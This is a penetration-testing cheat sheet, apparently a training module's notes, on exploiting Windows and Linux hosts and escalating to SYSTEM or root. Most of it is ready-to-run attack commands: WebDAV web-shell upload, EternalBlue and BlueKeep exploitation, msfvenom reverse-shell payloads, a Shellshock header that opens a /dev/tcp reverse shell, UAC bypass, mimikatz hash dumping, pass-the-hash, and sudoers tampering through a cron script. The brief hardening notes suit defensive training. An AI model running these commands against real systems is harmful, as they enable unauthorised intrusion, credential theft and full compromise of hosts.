# System / Host-Based Attacks

> Status: ✅ Reference complete
> Date started: 2026-10-27
> Date finished: 2026-10-27

## 1. Goal
Exploit host-level services to get a foothold, then escalate to SYSTEM/root — Windows and Linux. Placeholders: `<TARGET_IP>`, `<LOCAL_HOST_IP>`, `<LOCAL_PORT>`, `<USER>`, `<PW>`.

## Windows attack surface (context)
~70% market share + backward-compat + weak default hardening = big surface. Built in C/C++ → buffer overflows, UAF, integer overflow, SEH overwrites. Vuln categories: **info disclosure**, **buffer overflow** (stack/heap/integer/format-string), **RCE** (SMB/RDP/HTTP, macros, scripting engines), **privilege escalation** (service misconfig, token impersonation, DLL hijack, UAC bypass), **DoS**.
Notable CVEs to know: **MS08-067** (Conficker), **MS17-010 / EternalBlue** (WannaCry), **BlueKeep CVE-2019-0708** (RDP), **Zerologon CVE-2020-1472** (Netlogon→DA). Enterprise: Kerberoasting, AS-REP roasting, PtH, DCSync (see module 09 / AD).
```text
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"   # version → patch level
wmic qfe list brief | findstr /C:"KB"                   # installed patches
```

## Frequently exploited Windows services (detect & enumerate)
| Service | Port | Detect / enumerate | Note |
|---|---|---|---|
| **IIS** | 80/443 | `nmap -sV -p80,443` · `curl -I http://<TARGET_IP>/` | ASP.NET/PHP; SharePoint/OWA; misconfig → web shell |
| **WebDAV** | 80/443 | `curl -X OPTIONS http://<TARGET_IP>/ -I` · `curl -X PUT .../test.txt -d x` | HTTP verbs PROPFIND/MKCOL/PUT/DELETE; arbitrary upload |
| **SMB** | 445 | `nmap -p445 --script smb-protocols` · `smbclient -L //<TARGET_IP>/ -N` · `enum4linux` | ~100% of hosts; EternalBlue/Romance |
| **RDP** | 3389 | `nmap -p3389 --script rdp-ntlm-info` · `crowbar -b rdp -s <TARGET_IP>/32 -u <USER> -C <wl> -n 1` | brute/BlueKeep; lateral movement |
| **WinRM** | 5985/5986 | `nmap -p5985,5986 --script winrm-version` · `Test-WSMan <TARGET_IP>` · `evil-winrm -i <TARGET_IP> -u <USER> -p <PW>` | direct cmd exec with creds |
```bash
# one-shot Windows service sweep
nmap -sS -sV -p 80,443,445,3389,5985,5986 --open <TARGET_IP>
nmap --script smb-vuln*,rdp-vuln*,http-vuln* <TARGET_IP>
```
Defaults: Win10/11 client = SMB on, RDP/WinRM off; Server = SMB+RDP on, WinRM often on. Hardening (report side): disable SMBv1 (`Set-SmbServerConfiguration -EnableSMB1Protocol $false`), RDP NLA + non-default port, remove WebDAV module, patch.

---
# Windows Exploitation

## IIS WebDAV (full chain: enum → brute → upload → RCE)
```bash
# 1. detect WebDAV + allowed methods
nmap -p 80 --script http-enum,http-webdav-scan -sV <TARGET_IP>
curl -X OPTIONS http://<TARGET_IP>/ -I        # look for PUT/DELETE/COPY/MOVE/PROPFIND + "401 WWW-Authenticate: Basic realm=WebDAV"
curl -I http://<TARGET_IP>/webdav/
# 2. brute the Basic auth
curl -u admin:admin http://<TARGET_IP>/webdav/     # try defaults first
hydra -L common_users.txt -P common_passwords.txt <TARGET_IP> http-get /webdav/
# 3. analyse what can be uploaded + executed
davtest -auth <USER>:<PW> -url http://<TARGET_IP>/webdav/      # shows which extensions EXECUTE
# 4. manual method tests
curl -X PUT -u <USER>:<PW> http://<TARGET_IP>/webdav/test.txt -d "x"
curl -X PROPFIND -u <USER>:<PW> http://<TARGET_IP>/webdav/     # dir listing
# 5. web shell upload (Kali web shells in /usr/share/webshells/asp/)
cadaver http://<TARGET_IP>/webdav/            # auth → put /usr/share/webshells/asp/cmdasp.asp ; ls ; quit
curl -X PUT -u <USER>:<PW> http://<TARGET_IP>/webdav/shell.asp --data-binary @/usr/share/webshells/asp/cmdasp.asp
# browse http://<TARGET_IP>/webdav/cmdasp.asp → run whoami/systeminfo/net user
# 6. upgrade to meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f asp > shell.asp
# cadaver put shell.asp (rename to document_update.asp to blend in) ; start handler ; browse to trigger
# metasploit (automated)
use exploit/windows/iis/iis_webdav_upload_asp     # set HttpUsername/HttpPassword/PATH /webdav/metasploit.asp
use exploit/multi/handler                           # payload windows/meterpreter/reverse_tcp
```
Blacklist bypass: rename to `.asa` / `.cer` if `.asp` blocked. Cleanup: `curl -X DELETE -u <USER>:<PW> .../shell.asp` (or cadaver `delete`). Hardening: `Uninstall-WindowsFeature Web-DAV-Publishing`, strong auth, upload filtering.

## SMB
```bash
nmap -p 445 -sV -sC <TARGET_IP>
nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>
# metasploit
use auxiliary/scanner/smb/smb_login               # USER_FILE / PASS_FILE
use exploit/windows/smb/psexec                     # set SMBUser/SMBPass
# EternalBlue MS17-010 (CVE-2017-0143, SMBv1, unauth RCE → SYSTEM; Vista–2012 R2; WannaCry)
use auxiliary/scanner/smb/smb_ms17_010 ; set RHOSTS <TARGET_IP> ; run   # confirm first
use exploit/windows/smb/ms17_010_eternalblue       # set RHOSTS/LHOST ; payload windows/x64/meterpreter/reverse_tcp → getuid = NT AUTHORITY\SYSTEM
psexec.py <USER>@<TARGET_IP> cmd.exe
# Manual EternalBlue (AutoBlue-MS17-010)
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010 && pip install -r requirements.txt
cd shellcode && chmod +x shell_prep.sh && ./shell_prep.sh   # set LHOST/LPORT
nc -nvlp 1234
cd .. && python eternalblue_exploit7.py <TARGET_IP> shellcode/sc_x64.bin
```

## RDP
```bash
nmap -sV <TARGET_IP>                                  # 3389/tcp ms-wbt-server = RDP
use auxiliary/scanner/rdp/rdp_scanner
# BlueKeep CVE-2019-0708 (unauth RCE → SYSTEM; affects XP–2008 R2; NLA blocks it)
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep ; set RHOSTS <TARGET_IP> ; run   # "target is vulnerable"
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce   # ! kernel crash risk !
#   show targets ; set TARGET 2 (Win7 SP1/2008 R2 x64) ; set PAYLOAD windows/x64/meterpreter/reverse_tcp ; set LHOST
#   crash-tuning: set GROOMSIZE 50 / GROOM_ALLOCATIONS 25 / GROOM_DELTA 5 ; set VERBOSE true → exploit
hydra -L common_users.txt -P unix_passwords.txt rdp://<TARGET_IP> -s <PORT>
crowbar -b rdp -s <TARGET_IP>/32 -u <USER> -C <wordlist> -n 1
xfreerdp /u:<USER> /p:<PW> /v:<TARGET_IP>:<PORT>
xfreerdp /u:<USER> /p:<PW> /v:<TARGET_IP>:<PORT> /w:1920 /h:1080 /fonts /smart-sizing
```

## WinRM (5985/5986)
```bash
nmap -sV -p 5985 <TARGET_IP>
crackmapexec winrm <TARGET_IP> -u <USER> -p unix_passwords.txt
crackmapexec winrm <TARGET_IP> -u <USER> -p <PW> -x "whoami"
evil-winrm -i <TARGET_IP> -u <USER> -p '<PW>'
use exploit/windows/winrm/winrm_script_exec        # set USERNAME/PASSWORD/FORCE_VBS true
```

## Windows Privilege Escalation
```bash
# Kernel — enumerate missing patches
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f exe -o payload.exe
python3 -m http.server      # host payload, download on target
# Windows-Exploit-Suggester (systeminfo output):
python ./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database YYYY-MM-DD-mssb.xlsx --systeminfo sysinfo.txt
# metasploit
use exploit/multi/handler                          # payload windows/x64/meterpreter/reverse_tcp
use post/multi/recon/local_exploit_suggester       # set SESSION
# meterpreter: getprivs ; getsystem
# known local-exploit modules:
exploit/windows/local/bypassuac_eventvwr | bypassuac_sdclt | bypassuac_dotnet_profiler
exploit/windows/local/ms10_092_schelevator | ms14_058_track_popup_menu | ms15_051_client_copy_image
exploit/windows/local/ms16_014_wmi_recv_notif | cve_2019_1458_wizardopium | cve_2020_1054_drawiconex_lpe
```

### UAC bypass (UACME)
```text
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f exe > backdoor.exe
# unprivileged meterpreter:
cd C:\\ ; mkdir Temp ; cd Temp
upload /root/backdoor.exe ; upload /root/UACME/Akagi64.exe
shell → Akagi64.exe 23 C:\Temp\backdoor.exe        # akagi64.exe [Key] [Param]
# elevated session: ps -S lsass.exe ; migrate <lsass_PID> ; hashdump
```

### Access token impersonation
Tokens (made by LSASS at logon) = temporary keys describing a process's security context. **Impersonate-level** (non-interactive logon) works only on the local box; **Delegate-level** (interactive/RDP logon) can act on other networked devices. Need one of: **SeAssignPrimaryToken**, **SeCreateToken**, or **SeImpersonatePrivilege**.
```text
# meterpreter (unprivileged):
pgrep explorer ; migrate <explorer_PID> ; getuid ; getprivs
load incognito ; list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"            # or "DOMAIN\Administrator"
getuid ; getprivs
```

### Alternate Data Streams (ADS) — NTFS hiding
NTFS files have a data stream + resource stream; attackers hide payloads in a named ADS to dodge signature AV / static analysis.
```text
notepad.exe file.txt:secret.txt            # edits the hidden stream; file.txt looks empty
type malware.exe > nothing_bad.txt:mal.exe # hide an exe in a stream (delete the original yourself)
mklink good.exe C:\nothing_bad.txt:mal.exe # symlink to RUN the hidden exe
dir /r                                      # reveal streams
```

### Windows credential dumping
Hashes live in the **SAM** (locked by the NT kernel, encrypted with syskey → dump from **LSASS** memory, needs admin). **LSA** handles auth. **LM** (pre-NT4): password split in 2, upper-cased, DES, **no salt** → rainbow-table weak. **NTLM** (Vista+): MD4, case-sensitive, symbols/unicode, not split; LM disabled by default.
```text
# exploit → migrate to lsass → dump
pgrep lsass ; migrate <lsass_PID>
load kiwi ; creds_all ; lsa_dump_sam ; lsa_dump_secrets
# mimikatz:
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ; shell
mimikatz.exe → privilege::debug ; lsadump::sam ; lsadump::secrets ; sekurlsa::logonPasswords
# creds in unattended-install files (often base64 — easy decode):
#   C:\Windows\Panther\Unattend.xml  /  Autounattend.xml
# Pass-the-Hash (authenticate with the NTLM hash — no cracking; works post-patch; lateral movement)
#   hash line format = user:RID:LMhash:NTLMhash:::  (LM is often AAD3B...=empty)
#   Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::
use exploit/windows/smb/psexec                     # set SMBUser Administrator / SMBPass <LM>:<NTLM> ; target 1=upload 2=PowerShell
crackmapexec smb <TARGET_IP> -u Administrator -H <NTLM> -x "whoami"       # -X for PowerShell ; --local-auth for local acct
crackmapexec smb <range> -u Administrator -H <NTLM> -x hostname           # spray a subnet for reuse
# Impacket (pass -hashes LM:NTLM):
psexec.py  -hashes <LM>:<NTLM> <DOMAIN>/Administrator@<TARGET_IP>
wmiexec.py -hashes <LM>:<NTLM> <DOMAIN>/Administrator@<TARGET_IP>          # wmiexec often more reliable/quieter
```
ACCESS_DENIED → check hash + privileges; payload fails → try other psexec target or wmiexec. Defense: Credential Guard, LAPS, restrict WMI/DCOM, NTLM auditing.

---
# Linux Exploitation

## Frequently exploited Linux services (detect & attack surface)
Linux = kernel (Torvalds) + GNU tools; distros: Kali, Ubuntu, Debian, CentOS/RHEL, Arch.
| Service | Port | Detect / enumerate | Common vulns |
|---|---|---|---|
| **Apache HTTP** | 80/443 | `nmap -sV -p80,443` · `nmap -p80 --script http-enum,http-vuln*` | Shellshock (CVE-2014-6271), mod_ssl overflow, traversal, SSRF → web shell |
| **SSH** | 22 | `nmap -p22 --script ssh-auth-methods,ssh2-enum-algos` | weak creds, key exposure, config weakness |
| **FTP** | 21 | `nmap -p21 --script ftp-anon,ftp-bounce` · `ftp <TARGET_IP>` | anon write, weak creds, bounce, cleartext |
| **Samba** | 139/445 | `smbclient -L //<TARGET_IP>/ -N` · `nmap -p445 --script smb-os-discovery,smb-vuln*` | SambaCry (CVE-2017-7494), weak shares, info disclosure |
| **MySQL/MariaDB** | 3306 | `mysql -h <TARGET_IP> -u root -p` · `hydra ... mysql://<TARGET_IP>` | default/weak root, excessive privs |
| **NFS** | 2049 | `showmount -e <TARGET_IP>` | world r/w exports, no_root_squash |
| **RPC** | 111 | `rpcinfo -p <TARGET_IP>` | IPC used by NFS etc. |
```bash
nmap -sS -sV -p 21,22,80,443,445,3306,2049,111 <TARGET_IP>   # Linux service sweep
nmap --script vuln <TARGET_IP>
```
Common chains: Apache vuln → web shell → reverse shell → privesc · weak SSH creds → access → lateral → exfil · Samba RCE → root. Hardening (report): SSH `PermitRootLogin no` + key-only + non-default port; Apache `ServerTokens Prod`/`ServerSignature Off`/`Options -Indexes`; Samba `server min protocol = SMB2`.

## Shellshock (CVE-2014-6271, Bash ≤4.3 via CGI)
Bash runs trailing commands in a crafted env var: `() { :; }; <cmd>`. Injected through HTTP headers (User-Agent/Cookie/Referer) that CGI passes to Bash → RCE as the web-server user.
```bash
# find CGI: /cgi-bin/ , /cgi-bin/{test,status,admin}.cgi , /gettime.cgi
# detect
nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/test.cgi <TARGET_IP>
curl -H "User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd" http://<TARGET_IP>/cgi-bin/test.cgi
# reverse shell via header (start nc -nlvp 1234 first)
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<LOCAL_HOST_IP>/1234 0>&1" http://<TARGET_IP>/cgi-bin/test.cgi
# metasploit
use exploit/multi/http/apache_mod_cgi_bash_env_exec   # set RHOSTS/TARGETURI /gettime.cgi ; payload linux/x86/meterpreter/reverse_tcp (or cmd/unix/reverse_bash)
# local vuln test / fix check
env x='() { :;}; echo vulnerable' bash -c "echo test"   # prints "vulnerable" = unpatched
```

## FTP / SSH / Samba footholds
```bash
ftp <TARGET_IP> ; searchsploit ProFTPD
hydra -L common_users.txt -P unix_passwords.txt <TARGET_IP> -t 4 ftp
ssh <USER>@<TARGET_IP>     # then: id ; cat /etc/*release ; uname -r ; find / -name "flag"
hydra -L common_users.txt -P common_passwords.txt <TARGET_IP> -t 4 ssh
smbmap -u <USER> -p '<PW>' -H <TARGET_IP>
enum4linux -a -u "<USER>" -p "<PW>" <TARGET_IP>
hydra -l admin -P unix_passwords.txt <TARGET_IP> smb
```

## Linux Privilege Escalation
```bash
# Kernel — Linux-Exploit-Suggester / linpeas (fileless: pipe to bash, no disk trace)
curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
# (kernel exploits are risky → data loss/crash; confirm version range first)

# Cron jobs
crontab -l ; cat /etc/crontab ; find / -name <CRONJOB_SCRIPT>
grep -rnw / -e "/etc/shadow_bkp" 2>/dev/null    # find the script that references a known file
printf '#!/bin/bash\necho "<USER> ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/<CRONJOB_SCRIPT>

# SUID (GTFOBins — gtfobins.github.io)
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
file <FILE> ; strings <FILE>          # find the called binary → replace it:
rm <BINARY> ; cp /bin/bash <BINARY> ; ./<FILE>

# sudo rights
sudo -l ; sudo man ls → !/bin/bash    # GTFOBins the allowed binary
```

### Linux credential dumping
Hashes are in **/etc/shadow** (root-only); /etc/passwd is world-readable but holds no hashes. Can't pass-the-hash like NTLM — must crack. Algorithm shown by the `$N$` prefix:
| Prefix | Algorithm | Crackability |
|---|---|---|
| `$1$` | MD5 | trivial |
| `$2$` | Blowfish (bcrypt) | easy-ish |
| `$5$` | SHA-256 | possible |
| `$6$` | SHA-512 | slow |
```bash
cat /etc/passwd ; sudo cat /etc/shadow
unshadow passwd shadow > unshadowed.txt ; john --wordlist=rockyou.txt unshadowed.txt
use post/linux/gather/hashdump         # metasploit, post-exploit
use auxiliary/analyze/crack_linux      # set SHA512 true
```

> Windows foothold order: default/weak creds → service exploit (EternalBlue/WebDAV/BlueKeep) → migrate → `getprivs`/`getsystem` → token impersonation / UAC bypass → dump hashes → PtH. Linux: service exploit → shell → `sudo -l` + SUID (GTFOBins) + cron + kernel → dump /etc/shadow.
